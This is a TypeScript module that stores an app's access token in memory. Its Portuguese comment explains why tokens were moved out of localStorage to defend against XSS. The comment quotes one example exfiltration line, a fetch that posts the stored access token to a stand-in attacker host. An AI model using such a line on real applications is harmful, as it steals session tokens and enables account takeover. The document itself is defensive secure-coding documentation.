/**
 * Armazenamento do access token — em memória, deliberadamente.
 *
 * ## Por que não `localStorage`
 *
 * Antes o access token E o refresh token ficavam em `localStorage`. Qualquer
 * XSS na aplicação (uma dependência comprometida, um `dangerouslySetInnerHTML`
 * futuro, uma extensão maliciosa) lia os dois com uma linha:
 *
 *     fetch('https://atacante/', {method:'POST', body: localStorage.access_token})
 *
 * O access token expira em 30 min, o que já é ruim. O refresh valia **1 dia**
 * e servia para gerar access tokens novos o tempo todo — um XSS de um segundo
 * virava acesso persistente à conta.
 *
 * ## O desenho atual
 *
 * - **refresh token**: cookie `httpOnly` gravado pelo backend. JavaScript não
 *   consegue ler, então nem o XSS consegue. Ver `PRISMA_backend/users/cookies.py`.
 * - **access token**: esta variável de módulo. Não sobrevive a um F5 — e é
 *   isso mesmo que se quer. No boot da aplicação, o `AuthProvider` faz um
 *   refresh silencioso usando o cookie e recupera a sessão sem pedir senha.
 *
 * O que ainda fica em `localStorage` é só o "cartão de visita" do usuário
 * (`auth_user`: nome, e-mail, papel) para a interface não piscar durante o
 * refresh inicial. Não é credencial: quem alterar esse valor à mão muda o que
 * a tela desenha, mas cada rota da API revalida o papel no backend a partir
 * do token — o `role` do cliente nunca é fonte de autoridade.
 */

let accessToken: string | null = null;

/** Assinantes avisados quando o token muda (usado pelo AuthProvider). */
const listeners = new Set<(token: string | null) => void>();

export function getAccessToken(): string | null {
  return accessToken;
}

export function setAccessToken(token: string | null): void {
  accessToken = token && token !== "undefined" && token !== "null" ? token : null;
  listeners.forEach((listener) => listener(accessToken));
}

export function clearAccessToken(): void {
  setAccessToken(null);
}

export function onAccessTokenChange(
  listener: (token: string | null) => void,
): () => void {
  listeners.add(listener);
  return () => listeners.delete(listener);
}

/** Chave do perfil exibido na interface. Não é credencial (ver acima). */
export const AUTH_USER_KEY = "auth_user";
